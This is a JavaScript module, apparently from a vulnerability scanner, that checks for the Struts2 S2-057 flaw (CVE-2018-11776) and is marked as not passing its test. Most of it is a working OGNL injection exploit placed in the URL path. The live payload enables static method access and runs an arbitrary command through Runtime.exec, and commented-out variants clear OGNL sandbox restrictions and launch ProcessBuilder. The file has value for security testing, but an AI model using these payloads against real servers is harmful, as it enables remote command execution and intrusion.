
// 测试未通过
module.exports={
	tags:"web,struts2,057",
	"ID":"020102",
	des:"CVE-2018-11776,struts2 057Vulnerability detection",
	dependencies:"",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-057",
		"http://oe58q5lw3.bkt.clouddn.com/s/struts2/struts2/s2-057.war"],
	urls:["https://github.com/jas502n/St2-057/blob/master/README.md"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self,szUrl = url.replace(/\/[^\/\.]*?\.(jsp|do).*/gmi,'/'),
		    pld = 
			""
			/*
			+ "(#cmds={\"/bin/bash\",\"/c\", \"whoami\"})"
			+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
			+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
			// + ".(#ss=@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))"
			+ ".(@org.apache.commons.io.IOUtils@toString(new java.io.InputStreamReader(#process.getInputStream(),'utf-8')))"
			// + ".(#ss.toString())"
			
			 + "(#response=@org.apache.struts2.ServletActionContext@getResponse())"
			 + ".(#response.addHeader(\"struts2\",\"_struts2_\"))"
			 
			 // + "33+44"
			 + "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
			+ ".(#_memberAccess?(#_memberAccess=#dm):" 
			+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
			+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
			+ ".(#ognlUtil.getExcludedClasses().clear())"
			+ ".(#context.setMemberAccess(#dm))))."
			//////////*/
			/*
			+ "(#cmds=({'/bin/bash','/c',whoami'})"
			+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
			+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
			// + ".(#ss=@org.apache.commons.io.IOUtils@toString(new java.io.InputStreamReader(#process.getInputStream(),'utf-8')))"
			+ ".(#ss=@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))"
			+ ".(#ss.toString())"
			//*/

			 + `(
#_memberAccess["allowStaticMethodAccess"]=true,
#a=@java.lang.Runtime@getRuntime().exec('${_s.g_szCmd}').getInputStream(),
#b=new java.io.InputStreamReader(#a),
#c=new java.io.BufferedReader(#b),
#d=new char[51020],
#c.read(#d),
#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),
#jas502n.println(#d),
#jas502n.close())`
		    	;
		
		 // encodeURIComponent
		szUrl += ("${(" + encodeURIComponent(pld.replace(/[\r\n]/gmi,'')).replace(/#/gmi,'%23').replace(/ /gmi,'%20') +")}")+"/actionChain1.action";
		// szUrl += ("${(7*7)}")+"/actionChain1.action";
		_s.log(szUrl);
		
		_s.request(_s.fnOptHeader({method: 'GET',uri: szUrl
		    ,headers:
		    {
		    	"User-Agent": _s.g_szUa
		    }})
		  ,function (error, response, body)
		  {
			_s.error(error || response.headers);
			  // _s.log(this.uri.pathname);
			  // console.log(body);
				var ss = body;// this.uri.pathname + 
				// console.log(ss)
			  if(/whoami:/g.test(ss) && /cmdend/g.test(ss))
			  {
			  	var r = {"url":url,"send":pld,"vul":true};
	  			fnCbk(r,_t);
			  }
		  }
		  
		);
	}
};